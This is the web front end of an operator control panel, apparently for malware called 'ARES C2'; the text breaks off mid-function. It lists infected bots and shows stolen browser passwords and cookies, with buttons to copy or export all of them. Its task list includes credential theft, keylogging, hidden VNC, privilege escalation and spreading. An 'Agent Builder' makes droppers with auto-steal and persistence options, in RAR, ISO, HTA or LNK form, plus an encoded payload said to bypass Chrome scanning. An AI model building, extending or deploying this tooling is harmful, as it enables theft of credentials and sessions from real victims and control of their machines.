.ck-table td{padding:7px 10px;border-bottom:1px solid rgba(30,30,50,0.3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:'JetBrains Mono';font-size:11px}
.ck-table .col-dom{width:25%}.ck-table .col-name{width:22%}.ck-table .col-val{width:40%}.ck-table .col-sec{width:13%}
.ck-wrap{max-height:65vh;overflow-y:auto}
.data-count{color:var(--green);font-size:13px;margin:0 0 12px;font-weight:600;display:flex;align-items:center;gap:8px}
.data-count .badge{background:var(--green-dim);padding:2px 10px;border-radius:20px;font-size:11px}
.copy-btn{background:none;border:1px solid var(--border);color:var(--muted);padding:2px 8px;border-radius:4px;cursor:pointer;font-size:10px;font-family:'Inter';margin-left:6px;transition:.2s}
.copy-btn:hover{color:var(--red);border-color:var(--red)}
/* === Stolen Data Tab v2 === */
.data-tab-header{display:flex;align-items:center;gap:16px;margin-bottom:20px;flex-wrap:wrap}
.data-tab-header h2{color:var(--red);margin:0;font-size:20px;font-weight:800;display:flex;align-items:center;gap:10px}
.data-tab-header h2::before{content:'';display:inline-block;width:4px;height:22px;background:var(--accent);border-radius:3px}
.data-stats-bar{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:24px}
.data-stat-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px 16px;text-align:center;position:relative;overflow:hidden;transition:.3s}
.data-stat-card::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--accent);opacity:0;transition:.3s}
.data-stat-card:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(0,0,0,0.3)}
.data-stat-card:hover::after{opacity:1}
.data-stat-card .ds-icon{font-size:20px;margin-bottom:4px}
.data-stat-card .ds-num{font-size:26px;font-weight:800}
.data-stat-card .ds-label{font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:1.5px;font-weight:600;margin-top:2px}
.section-header{display:flex;align-items:center;gap:10px;margin:24px 0 14px;padding:0}
.section-header .sec-icon{font-size:22px;line-height:1}
.section-header h3{font-size:16px;font-weight:700;margin:0}
.section-header .sec-count{font-size:11px;font-weight:600;padding:2px 10px;border-radius:12px}
.section-header .sec-actions{margin-left:auto;display:flex;gap:6px}
.section-divider{height:1px;background:linear-gradient(90deg,transparent,var(--border),transparent);margin:8px 0 0}
.pw-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px 16px;transition:.3s;position:relative;overflow:hidden}
.pw-card::before{content:'';position:absolute;top:0;left:0;bottom:0;width:3px;background:var(--green);border-radius:3px 0 0 3px;opacity:0.6}
.pw-card:hover{border-color:rgba(0,230,118,0.3);box-shadow:0 2px 16px rgba(0,0,0,0.2)}
.pw-card .pw-url{display:flex;align-items:center;gap:8px;margin-bottom:8px;padding-bottom:8px;border-bottom:1px solid rgba(45,45,65,0.3)}
.pw-card .pw-url-text{color:var(--text-dim);font-size:11px;font-family:'JetBrains Mono';white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1}
.pw-card .pw-browser{font-size:9px;padding:2px 8px;border-radius:4px;background:rgba(68,138,255,0.1);color:var(--blue);font-weight:600;white-space:nowrap}
.pw-card .pw-status{font-size:9px;padding:2px 8px;border-radius:4px;font-weight:600}
.pw-card .pw-status.ok{background:var(--green-dim);color:var(--green)}
.pw-card .pw-status.fail{background:rgba(255,56,96,0.1);color:var(--red)}
.pw-card .pw-field{display:flex;align-items:center;gap:8px;margin:4px 0;min-height:24px}
.pw-card .pw-label{color:var(--muted);font-size:9px;text-transform:uppercase;font-weight:600;letter-spacing:0.5px;min-width:52px;flex-shrink:0}
.pw-card .pw-value{color:var(--text);font-size:12px;font-family:'JetBrains Mono';word-break:break-all;flex:1}
.pw-card .pw-pass-value{color:var(--green);font-weight:600;font-size:12px;font-family:'JetBrains Mono';flex:1;display:flex;align-items:center;gap:6px}
.pw-card .pw-pass-hidden{color:var(--muted);font-size:14px;letter-spacing:2px}
.pw-card .pw-actions{display:flex;gap:4px;flex-shrink:0}
.pw-toggle{background:none;border:1px solid var(--border);color:var(--muted);width:24px;height:24px;border-radius:4px;cursor:pointer;font-size:12px;display:flex;align-items:center;justify-content:center;transition:.2s;padding:0}
.pw-toggle:hover{color:var(--green);border-color:var(--green)}
.ck-domain-group{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:10px;transition:.3s}
.ck-domain-group:hover{border-color:rgba(255,193,7,0.3)}
.ck-domain-header{display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;background:rgba(255,255,255,0.02);border-bottom:1px solid transparent;transition:.2s;user-select:none}
.ck-domain-header:hover{background:rgba(255,193,7,0.04)}
.ck-domain-header.open{border-bottom-color:var(--border)}
.ck-domain-header .ck-dom-icon{font-size:14px;opacity:0.6}
.ck-domain-header .ck-dom-name{font-size:13px;font-weight:600;color:var(--text);flex:1}
.ck-domain-header .ck-dom-count{font-size:10px;color:var(--yellow);background:var(--yellow-dim);padding:2px 8px;border-radius:10px;font-weight:600}
.ck-domain-header .ck-dom-arrow{color:var(--muted);font-size:10px;transition:.3s}
.ck-domain-header.open .ck-dom-arrow{transform:rotate(180deg)}
.ck-domain-body{display:none;padding:0}
.ck-domain-body.open{display:block}
.shell-card{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:10px;transition:.3s}
.shell-card:hover{border-color:rgba(68,138,255,0.3)}
.shell-card-header{display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;background:rgba(255,255,255,0.02);border-bottom:1px solid transparent;transition:.2s;user-select:none}
.shell-card-header:hover{background:rgba(68,138,255,0.04)}
.shell-card-header.open{border-bottom-color:var(--border)}
.shell-card-header .sc-icon{font-size:14px}
.shell-card-header .sc-cmd{font-size:12px;font-family:'JetBrains Mono';color:var(--text);flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.shell-card-header .sc-badge{font-size:9px;padding:2px 8px;border-radius:4px;font-weight:600}
.shell-card-header .sc-badge.ok{background:var(--green-dim);color:var(--green)}
.shell-card-header .sc-badge.fail{background:rgba(255,56,96,0.1);color:var(--red)}
.shell-card-header .sc-arrow{color:var(--muted);font-size:10px;transition:.3s}
.shell-card-header.open .sc-arrow{transform:rotate(180deg)}
.shell-card-body{display:none;padding:0}
.shell-card-body.open{display:block}
.shell-card-body pre{background:var(--bg);margin:0;padding:14px 16px;font-size:12px;font-family:'JetBrains Mono';color:var(--green);max-height:400px;overflow:auto;white-space:pre-wrap;line-height:1.6;border:none}
.shell-card-body .sc-toolbar{display:flex;gap:6px;padding:8px 16px;background:rgba(0,0,0,0.15);border-top:1px solid var(--border)}
.data-empty-state{text-align:center;padding:80px 20px}
.data-empty-state .de-icon{font-size:56px;margin-bottom:16px;opacity:0.25}
.data-empty-state .de-title{color:var(--text-dim);font-size:16px;font-weight:600;margin-bottom:6px}
.data-empty-state .de-sub{color:var(--muted);font-size:13px}
.data-no-section{text-align:center;padding:30px 16px;color:var(--muted);font-size:13px;font-style:italic}
.bld-row{margin-bottom:12px}
.bld-label{display:block;color:var(--text-dim);font-size:10px;margin-bottom:4px;text-transform:uppercase;letter-spacing:1px;font-weight:600}
.bld-input{width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:8px;font-size:13px;font-family:'Inter';transition:.3s}
.bld-input:focus{outline:none;border-color:var(--red);box-shadow:0 0 15px var(--red-glow)}
select.bld-input{cursor:pointer;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23565a6e' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center}
.bld-check{color:var(--text-dim);font-size:12px;cursor:pointer;display:flex;align-items:center;padding:6px 0;transition:.2s}
.bld-check:hover{color:var(--text)}
.bld-check input{margin-right:8px;accent-color:var(--red)}
.bld-btn{background:var(--accent);color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:700;font-family:'Inter';letter-spacing:1px;transition:.3s}
.bld-btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px var(--red-glow)}
.bld-btn:disabled{opacity:.3;cursor:not-allowed;transform:none;box-shadow:none}
.format-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin:12px 0}
.format-opt{background:var(--bg);border:2px solid var(--border);border-radius:8px;padding:12px;cursor:pointer;text-align:center;transition:.3s}
.format-opt:hover{border-color:rgba(255,56,96,0.4)}
.format-opt.selected{border-color:var(--red);background:var(--red-glow)}
.format-opt .fmt-icon{font-size:24px;margin-bottom:4px}
.format-opt .fmt-name{font-size:12px;font-weight:600;color:var(--text)}
.format-opt .fmt-desc{font-size:9px;color:var(--muted);margin-top:2px}
</style></head><body>

<div class="login" id="login">
<h1>&#9760; ARES C2</h1>
<div class="sub">Command & Control Panel</div>
<input type="password" id="tokenInput" placeholder="Enter Auth Token" onkeydown="if(event.key==='Enter')doLogin()">
<button onclick="doLogin()">AUTHENTICATE</button>
</div>

<div class="app" id="app">
<div class="header">
<h1>&#9760; ARES C2</h1>
<span class="meta" id="uptime"></span>
</div>
<div class="tabs">
<div class="tab active" onclick="showTab('dashboard')">Dashboard</div>
<div class="tab" onclick="showTab('data')">Stolen Data</div>
<div class="tab" onclick="showTab('logs')">Task Log</div>
<div class="tab" onclick="showTab('builder')">Builder</div>
</div>

<div id="t-dashboard">
<div class="stats" id="stats"></div>
<div class="panel">
<table><thead><tr>
<th>ID</th><th>Host</th><th>User</th><th>IP</th><th>OS</th><th>Priv</th><th>Status</th><th>Last Seen</th><th>Actions</th>
</tr></thead><tbody id="bots"></tbody></table>
</div>
</div>

<div id="t-data" class="hidden panel">

<div class="data-tab-header">
<h2>&#128202; Intelligence Center</h2>
<select id="dataBotSelect" class="bld-input" style="width:280px;padding:8px 14px;font-size:12px" onchange="loadBotData(this.value)">
<option value="">&#9866; Select Bot &#9866;</option>
</select>
<input class="search-box" id="dataSearch" placeholder="&#128269; Search across all data..." oninput="filterAllData(this.value)" style="flex:1;min-width:200px;margin:0">
<button class="btn" onclick="refreshDataTab()" style="padding:6px 14px">&#128260; Refresh</button>
<span id="dataLastUpdate" style="color:var(--muted);font-size:11px;margin-left:auto;white-space:nowrap"></span>
</div>

<div id="dataEmpty" class="data-empty-state">
<div class="de-icon">&#128373;</div>
<div class="de-title">No Bot Selected</div>
<div class="de-sub">Select a bot above to view stolen credentials, cookies, and shell results</div>
</div>

<div id="dataContent" style="display:none">

<div class="data-stats-bar" id="dataMiniStats"></div>

<!-- Passwords Section -->
<div class="section-header">
<span class="sec-icon">&#128273;</span>
<h3 style="color:var(--green)">Passwords</h3>
<span id="pwCount" class="sec-count" style="background:var(--green-dim);color:var(--green)">0</span>
<div class="sec-actions">
<button class="btn" onclick="copyAllPasswords()" style="font-size:10px;padding:3px 10px">&#128203; Copy All</button>
<button class="btn" onclick="toggleAllPwVisibility()" style="font-size:10px;padding:3px 10px" id="pwVisToggle">&#128065; Show All</button>
</div>
</div>
<div class="section-divider"></div>
<div id="pwSection" class="cred-grid" style="margin-top:12px"></div>

<!-- Cookies Section -->
<div class="section-header">
<span class="sec-icon">&#127850;</span>
<h3 style="color:var(--yellow)">Cookies</h3>
<span id="ckCount" class="sec-count" style="background:var(--yellow-dim);color:var(--yellow)">0</span>
<div class="sec-actions">
<button class="btn" onclick="toggleAllCookieDomains(true)" style="font-size:10px;padding:3px 10px">Expand All</button>
<button class="btn" onclick="toggleAllCookieDomains(false)" style="font-size:10px;padding:3px 10px">Collapse All</button>
<button class="btn" onclick="copyAllCookies()" style="font-size:10px;padding:3px 10px">&#128203; Export JSON</button>
</div>
</div>
<div class="section-divider"></div>
<div id="ckSection" style="margin-top:12px;max-height:65vh;overflow-y:auto"></div>

<!-- Shell Results Section -->
<div class="section-header">
<span class="sec-icon">&#128187;</span>
<h3 style="color:var(--blue)">Shell Results</h3>
<span id="shellCount" class="sec-count" style="background:var(--blue-dim);color:var(--blue)">0</span>
<div class="sec-actions">
<button class="btn" onclick="toggleAllShellCards(true)" style="font-size:10px;padding:3px 10px">Expand All</button>
<button class="btn" onclick="toggleAllShellCards(false)" style="font-size:10px;padding:3px 10px">Collapse All</button>
</div>
</div>
<div class="section-divider"></div>
<div id="shellSection" style="margin-top:12px;max-height:70vh;overflow-y:auto"></div>

</div>
</div>

<div id="t-logs" class="hidden panel">
<h2 style="color:var(--red);margin-bottom:12px">Task Log</h2>
<div class="log" id="taskLog">Waiting for data...</div>
</div>

<div id="t-builder" class="hidden panel">
<h2 style="color:var(--red);margin-bottom:16px">Agent Builder</h2>

<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
<div class="data-card">
<h3 style="margin-bottom:12px">C2 Configuration</h3>
<div class="bld-row">
<label class="bld-label">C2 Host (IP or domain)</label>
<input id="bld-host" class="bld-input" value="" placeholder="192.168.1.100 or c2.example.com">
</div>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
<div class="bld-row">
<label class="bld-label">C2 Port</label>
<input id="bld-port" class="bld-input" type="number" value="443">
</div>
<div class="bld-row">
<label class="bld-label">Protocol</label>
<select id="bld-proto" class="bld-input"><option value="http">HTTP</option><option value="https">HTTPS</option></select>
</div>
</div>
<div class="bld-row">
<label class="bld-label">Campaign Name</label>
<input id="bld-campaign" class="bld-input" value="" placeholder="OP_FIELDTEST">
</div>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
<div class="bld-row">
<label class="bld-label">Beacon Sleep (ms)</label>
<input id="bld-sleep" class="bld-input" type="number" value="10000">
</div>
<div class="bld-row">
<label class="bld-label">Jitter (%)</label>
<input id="bld-jitter" class="bld-input" type="number" value="30">
</div>
</div>
<div class="bld-row">
<label class="bld-label">Kill Date (days from now)</label>
<input id="bld-kill" class="bld-input" type="number" value="30">
</div>
</div>

<div class="data-card">
<h3 style="margin-bottom:12px">Agent Options</h3>
<div class="bld-row">
<label class="bld-label">Output EXE Name</label>
<input id="bld-exe" class="bld-input" value="" placeholder="(auto — safe random name)">
</div>
<div style="margin:8px 0">
<label class="bld-check"><input type="checkbox" id="bld-autosteal" checked> Auto-steal credentials on connect</label>
</div>
<div style="margin:8px 0">
<label class="bld-check"><input type="checkbox" id="bld-persist"> Auto-persist (scheduled task)</label>
</div>

<div style="border-top:1px solid var(--border);margin-top:16px;padding-top:16px">
<label class="bld-label">Delivery Format</label>
<div class="format-grid" id="formatGrid">
<div class="format-opt selected" onclick="selFmt(this,'rar')" data-fmt="rar"><div class="fmt-icon">&#x1F512;</div><div class="fmt-name">RAR</div><div class="fmt-desc">Password protected</div></div>
<div class="format-opt" onclick="selFmt(this,'iso')" data-fmt="iso"><div class="fmt-icon">&#x1F4BF;</div><div class="fmt-name">ISO</div><div class="fmt-desc">Disk image mount</div></div>
<div class="format-opt" onclick="selFmt(this,'hta')" data-fmt="hta"><div class="fmt-icon">&#x1F310;</div><div class="fmt-name">HTA</div><div class="fmt-desc">HTML Application</div></div>
<div class="format-opt" onclick="selFmt(this,'lnk')" data-fmt="lnk"><div class="fmt-icon">&#x1F517;</div><div class="fmt-name">LNK</div><div class="fmt-desc">Shortcut dropper</div></div>
<div class="format-opt" onclick="selFmt(this,'zip')" data-fmt="zip"><div class="fmt-icon">&#x1F4E6;</div><div class="fmt-name">ZIP</div><div class="fmt-desc">Standard archive</div></div>
</div>
</div>

<div style="border-top:1px solid var(--border);margin-top:16px;padding-top:16px">
<h3 style="margin-bottom:8px;color:var(--green)">Access Token</h3>
<div style="display:flex;gap:8px;align-items:center">
<input id="bld-token-display" class="bld-input" value="" readonly style="font-family:'JetBrains Mono';color:var(--green);flex:1">
<button class="bld-btn" style="background:rgba(45,45,65,0.6);min-width:50px;padding:10px" onclick="genToken()">New</button>
<button class="bld-btn" style="background:rgba(45,45,65,0.6);min-width:55px;padding:10px" onclick="copyText(document.getElementById('bld-token-display').value)">Copy</button>
</div>
<div style="color:var(--muted);font-size:11px;margin-top:4px">Token for panel access. Click "New" to generate.</div>
</div>

<div style="margin-top:20px">
<button class="bld-btn" id="buildBtn" onclick="doBuild()" style="width:100%">&#x26A1; BUILD AGENT</button>
</div>

<div id="buildStatus" style="margin-top:12px;display:none">
<div id="buildProgress" style="height:4px;background:var(--border);border-radius:4px;overflow:hidden;margin-bottom:8px">
<div id="buildBar" style="height:100%;width:0%;background:var(--accent);transition:width 0.5s ease"></div>
</div>
<div id="buildMsg" style="color:var(--muted);font-size:12px"></div>
</div>

<div id="buildResult" style="margin-top:12px;display:none;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px">
<div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
<span style="color:var(--green);font-size:22px">&#10003;</span>
<span style="color:var(--green);font-weight:700;font-size:15px">Build Successful</span>
</div>
<div id="buildInfo" style="font-size:12px;color:var(--muted);line-height:1.8"></div>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px">
<button class="bld-btn" id="downloadHta" style="background:var(--green-dim);color:var(--green);border:1px solid rgba(0,230,118,0.3)" onclick="">&#x1F512; Download Package</button>
<button class="bld-btn" id="downloadEnc" style="background:rgba(45,45,65,0.6);color:var(--text-dim);font-size:12px" onclick="">&#x1F4BE; Encoded .dat</button>
</div>
<div style="color:var(--muted);font-size:10px;margin-top:8px">Package = format-specific, bypasses Chrome scan &nbsp;|&nbsp; .dat = XOR encoded dropper</div>
<div id="decodeCmd" style="margin-top:10px;display:none">
<div style="color:var(--yellow);font-size:11px;margin-bottom:4px">&#x26A0; Deploy command:</div>
<div style="position:relative"><pre id="decodePre" style="background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px;font-size:11px;font-family:'JetBrains Mono';color:var(--green);overflow-x:auto;white-space:pre-wrap"></pre>
<button class="copy-btn" style="position:absolute;top:6px;right:6px" onclick="copyText(document.getElementById('decodePre').textContent)">copy</button></div>
</div>
</div>
</div>
</div>

<div class="data-card" style="margin-top:16px">
<h3>Build History</h3>
<div id="buildHistory" style="font-size:12px;color:var(--muted);margin-top:8px">No builds yet.</div>
</div>
</div>
</div>

<script>
let TOKEN='';
const H=()=>({headers:{'Authorization':'Bearer '+TOKEN,'Content-Type':'application/json'}});

async function doLogin(){
  TOKEN=document.getElementById('tokenInput').value;
  if(!TOKEN){alert('Enter auth token');return}
  try{
    const r=await fetch('/api/panel/stats',{headers:{'Authorization':'Bearer '+TOKEN}});
    if(r.status===401){alert('Invalid token!');return}
    const j=await r.json();
    sessionStorage.setItem('ares_token',TOKEN);
    document.getElementById('login').style.display='none';
    document.getElementById('app').style.display='block';
    refresh();
    setInterval(refresh,8000);
  }catch(e){alert('Cannot connect to C2: '+e.message)}
}
if(sessionStorage.getItem('ares_token')){
  document.getElementById('tokenInput').value=sessionStorage.getItem('ares_token');
}let _dataAutoRefresh=null;
let _allPasswords=[];
let _allCookies=[];
let _pwVisible=false;

async function initDataTab(){
  const bots=await fetch('/api/panel/bots',H()).then(r=>r.json());
  const sel=document.getElementById('dataBotSelect');
  const curVal=sel.value;
  sel.innerHTML='<option value="">\u2500 Select Bot \u2500</option>';
  for(const b of (bots||[])){
    const sIcon=b.status==='active'?'\u25CF':'\u25CB';
    const label=sIcon+' '+b.hostname+' ('+b.id.substr(0,8)+') \u2014 '+b.status;
    sel.innerHTML+='<option value="'+b.id+'" '+(b.id===curVal?'selected':'')+'>'+label+'</option>';
  }
  if(curVal)loadBotData(curVal);
  // Auto-refresh every 15 seconds
  if(_dataAutoRefresh)clearInterval(_dataAutoRefresh);
  _dataAutoRefresh=setInterval(()=>{
    const s=document.getElementById('dataBotSelect');
    if(s&&s.value&&!document.getElementById('t-data').classList.contains('hidden'))loadBotData(s.value);
  },15000);
}

const TASK_TYPES={1:'Shell',2:'Download',3:'Upload',4:'Screenshot',5:'Steal Creds',6:'Persist',7:'Kill Chrome',8:'Inject',9:'BOF',10:'Socks5',11:'hVNC',12:'Keylog',13:'Clip',14:'Escalate',15:'Spread',16:'Uninstall',17:'Chrome CDP',18:'Sleep',19:'Recon'};

async function loadBotData(botId){
  if(!botId){
    document.getElementById('dataEmpty').style.display='';
    document.getElementById('dataContent').style.display='none';
    return;
  }
  document.getElementById('dataEmpty').style.display='none';
  document.getElementById('dataContent').style.display='block';
  document.getElementById('dataLastUpdate').textContent='\u23F1 '+new Date().toLocaleTimeString();

  const[results,data]=await Promise.all([
    fetch('/api/panel/results/'+botId,H()).then(r=>r.json()).catch(()=>[]),
    fetch('/api/panel/data/'+botId,H()).then(r=>r.json()).catch(()=>null)
  ]);

  const rList=results||[];
  const dList=Array.isArray(data)?data:[];

  // Parse steal results from task results (task_type=5)
  let passwords=[];
  let cookies=[];
  let shellResults=[];

  for(const r of rList){
    if(r.task_type===5 && r.success && r.output){
      try{
        const parsed=JSON.parse(r.output);
        if(parsed.type==='steal_result'){
          if(parsed.pw_data)passwords=passwords.concat(parsed.pw_data.map(p=>({...p,_src:'task',_taskId:r.task_id})));
          if(parsed.ck_data)cookies=cookies.concat(parsed.ck_data.map(c=>({...c,_src:'task',_taskId:r.task_id})));
        }
      }catch(e){}
    }else if(r.task_type!==5){
      shellResults.push(r);
    }
  }

  // Parse exfil data for passwords/cookies
  for(const d of dList){
    const tp=(d.type||'').toLowerCase();
    if(tp.includes('password')||tp==='steal_result'){
      const entries=d.pw_data||d.data||d.entries||[];
      passwords=passwords.concat(entries.map(p=>({...p,_src:'exfil'})));
    }
    if(tp.includes('cookie')||tp==='steal_result'){
      const entries=d.ck_data||d.data||d.entries||[];
      cookies=cookies.concat(entries.map(c=>({...c,_src:'exfil'})));
    }
  }

  _allPasswords=passwords;
  _allCookies=cookies;

  // Stats bar
  document.getElementById('dataMiniStats').innerHTML=
    dataStat('\uD83D\uDD11',passwords.length,'PASSWORDS','var(--green)')+
    dataStat('\uD83C\uDF6A',cookies.length,'COOKIES','var(--yellow)')+
    dataStat('\uD83D\uDCBB',shellResults.length,'SHELL RESULTS','var(--blue)')+
    dataStat('\u2705',rList.filter(r=>r.success).length,'SUCCESS','var(--green)')+
    dataStat('\u274C',rList.filter(r=>!r.success).length,'FAILED','var(--red)');

  document.getElementById('pwCount').textContent=passwords.length;
  document.getElementById('ckCount').textContent=cookies.length;
  document.getElementById('shellCount').textContent=shellResults.length;

  renderPasswords(passwords);
  renderCookies(cookies);
  renderShellResults(shellResults);

  // Apply search filter if active
  const q=document.getElementById('dataSearch').value;
  if(q)filterAllData(q);
}

function dataStat(icon,val,label,color){
  return '<div class="data-stat-card">'+
    '<div class="ds-icon">'+icon+'</div>'+
    '<div class="ds-num" style="color:'+color+'">'+esc(val)+'</div>'+
    '<div class="ds-label">'+label+'</div></div>';
}

function renderPasswords(passwords){
  const el=document.getElementById('pwSection');
  if(passwords.length===0){
    el.innerHTML='<div class="data-no-section" style="grid-column:1/-1">\uD83D\uDD12 No passwords captured yet</div>';
    return;
  }
  el.innerHTML=passwords.map((p,i)=>{
    const url=esc(p.u||p.url||'');
    const user=esc(p.n||p.user||p.username||'');
    const pass=p.pw||p.pass||p.password||p.value||'';
    const passEsc=esc(pass);
    const br=esc(p.b||p.browser||'');
    const profile=esc(p.p||p.profile||'');
    const st=p.s||p.status||p.decrypt_status||'';
    const stClass=st==='ok'?'ok':'fail';
    const searchText=(url+' '+user+' '+pass+' '+br).toLowerCase();
    return '<div class="pw-card" data-search="'+esc(searchText)+'">'+
      '<div class="pw-url">'+
        '<span class="pw-url-text" title="'+url+'">'+url+'</span>'+
        (br?'<span class="pw-browser">'+br+(profile?' / '+profile:'')+'</span>':'')+
        (st?'<span class="pw-status '+stClass+'">'+st.toUpperCase()+'</span>':'')+
      '</div>'+
      '<div class="pw-field">'+
        '<span class="pw-label">User</span>'+
        '<span class="pw-value">'+user+'</span>'+
        '<div class="pw-actions">'+
          '<button class="pw-toggle" onclick="copyText(\''+esc(user).replace(/'/g,'\\\'')+'\')">\uD83D\uDCCB</button>'+
        '</div>'+
      '</div>'+
      '<div class="pw-field">'+
        '<span class="pw-label">Pass</span>'+
        '<span class="pw-pass-value">'+
          '<span class="pw-pass-text" data-pass="'+passEsc+'">'+(_pwVisible?passEsc:'<span class="pw-pass-hidden">\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022</span>')+'</span>'+
        '</span>'+
        '<div class="pw-actions">'+
          '<button class="pw-toggle" onclick="togglePw(this)" title="Show/Hide">\uD83D\uDC41</button>'+
          '<button class="pw-toggle" onclick="copyText(\''+esc(pass).replace(/'/g,'\\\'')+'\')">\uD83D\uDCCB</button>'+
        '</div>'+
      '</div>'+
    '</div>';
  }).join('');
}

function togglePw(btn){
  const field=btn.closest('.pw-field');
  const textEl=field.querySelector('.pw-pass-text');
  const pass=textEl.getAttribute('data-pass');
  if(textEl.querySelector('.pw-pass-hidden')){
    textEl.textContent=pass;
  }else{
    textEl.innerHTML='<span class="pw-pass-hidden">\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022</span>';
  }
}

function toggleAllPwVisibility(){
  _pwVisible=!_pwVisible;
  document.getElementById('pwVisToggle').innerHTML=_pwVisible?'\uD83D\uDC41 Hide All':'\uD83D\uDC41 Show All';
  document.querySelectorAll('.pw-pass-text').forEach(el=>{
    const pass=el.getAttribute('data-pass');
    if(_pwVisible) el.innerHTML=pass;
    else el.innerHTML='<span class="pw-pass-hidden">\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022</span>';
  });
}

function copyAllPasswords(){
  if(_allPasswords.length===0)return;
  const lines=_allPasswords.map(p=>{
    const url=p.u||p.url||'';const user=p.n||p.user||p.username||'';
    const pass=p.pw||p.pass||p.password||p.value||'';
    return url+'\t'+user+'\t'+pass;
  }).join('\n');
  copyText('URL\tUsername\tPassword\n'+lines);
}

function renderCookies(cookies){
  const el=document.getElementById('ckSection');
  if(cookies.length===0){
    el.innerHTML='<div class="data-no-section">\uD83C\uDF6A No cookies captured yet</div>';
    return;
  }
  // Group by domain
  const groups={};
  for(const c of cookies){
    const dom=c.h||c.host||c.domain||'unknown';
    if(!groups[dom])groups[dom]=[];
    groups[dom].push(c);
  }
  const domains=Object.keys(groups).sort();
  let html='';
  for(const dom of domains){
    const items=groups[dom];
    const gid='ckg_'+dom.replace(/[^a-zA-Z0-9]/g,'_');
    html+='<div class="ck-domain-group" data-search="'+esc(dom.toLowerCase())+'">';
    html+='<div class="ck-domain-header" onclick="toggleCookieDomain(\''+gid+'\')">'+
      '<span class="ck-dom-icon">\uD83C\uDF6A</span>'+
      '<span class="ck-dom-name">'+esc(dom)+'</span>'+
      '<span class="ck-dom-count">'+items.length+'</span>'+
      '<span class="ck-dom-arrow">\u25BC</span>'+
    '</div>';
    html+='<div class="ck-domain-body" id="'+gid+'">';
    html+='<table class="ck-table"><thead><tr>'+
      '<th style="width:28%">Name</th><th style="width:45%">Value</th><th style="width:15%">Path</th><th style="width:12%">Browser</th>'+
      '</tr></thead><tbody>';
    for(const c of items){
      const nm=esc(c.n||c.name||'');
      const val=esc((c.v||c.value||c.encrypted_value||'').substring(0,120));
      const path=esc(c.p||c.path||'/');
      const br=esc(c.b||c.browser||'');
      html+='<tr data-search="'+esc((dom+' '+esc(nm)+' '+val).toLowerCase())+'">';
      html+='<td><code style="color:var(--yellow);font-size:11px">'+esc(nm)+'</code></td>';
      html+='<td style="font-size:11px;color:var(--muted)">'+val+
        ' <button class="copy-btn" onclick="copyText(\''+esc((c.v||c.value||'').replace(/'/g,'\\\'')).substring(0,200)+'\')" style="opacity:0.5">copy</button></td>';
      html+='<td style="font-size:10px;color:var(--muted)">'+path+'</td>';
      html+='<td style="font-size:10px;color:var(--muted)">'+br+'</td></tr>';
    }
    html+='</tbody></table></div></div>';
  }
  el.innerHTML=html;
}

function toggleCookieDomain(id){
  const body=document.getElementById(id);
  const header=body.previousElementSibling;
  body.classList.toggle('open');
  header.classList.toggle('open');
}

function toggleAllCookieDomains(expand){
  document.querySelectorAll('.ck-domain-body').forEach(b=>{
    if(expand){b.classList.add('open');b.previousElementSibling.classList.add('open')}
    else{b.classList.remove('open');b.previousElementSibling.classList.remove('open')}
  });
}

function copyAllCookies(){
  if(_allCookies.length===0)return;
  const exportData=_allCookies.map(c=>({
    domain:c.h||c.host||c.domain||'',
    name:c.n||c.name||'',
    value:c.v||c.value||'',
    path:c.p||c.path||'/',
    browser:c.b||c.browser||''
  }));
  copyText(JSON.stringify(exportData,null,2));
}

function renderShellResults(results){
  const el=document.getElementById('shellSection');
  if(results.length===0){
    el.innerHTML='<div class="data-no-section">\uD83D\uDCBB No shell results yet</div>';
    return;
  }
  el.innerHTML=results.map((r,i)=>{
    const ok=r.success;
    const typeName=TASK_TYPES[r.task_type]||'Type '+r.task_type;
    const output=r.output||'(no output)';
    const outputEsc=esc(output);
    const lines=output.split('\n').length;
    const preview=esc(output.split('\n')[0]||'').substring(0,80);
    const sid='sh_'+i;
    return '<div class="shell-card" data-search="'+esc((typeName+' '+output).toLowerCase().substring(0,500))+'">'+
      '<div class="shell-card-header" onclick="toggleShellCard(\''+sid+'\')">'+
        '<span class="sc-icon">\uD83D\uDCBB</span>'+
        '<span class="sc-cmd">'+typeName+
          ' <span style="color:var(--muted);font-size:10px;font-family:JetBrains Mono">'+(r.task_id?'#'+r.task_id:'#'+(i+1))+'</span>'+
          ' <span style="color:var(--muted);font-size:10px;margin-left:4px">'+preview+'</span>'+
        '</span>'+
        '<span class="sc-badge '+(ok?'ok':'fail')+'">'+(ok?'SUCCESS':'FAILED')+'</span>'+
        '<span style="color:var(--muted);font-size:10px">'+lines+' lines</span>'+
        '<span class="sc-arrow">\u25BC</span>'+
      '</div>'+
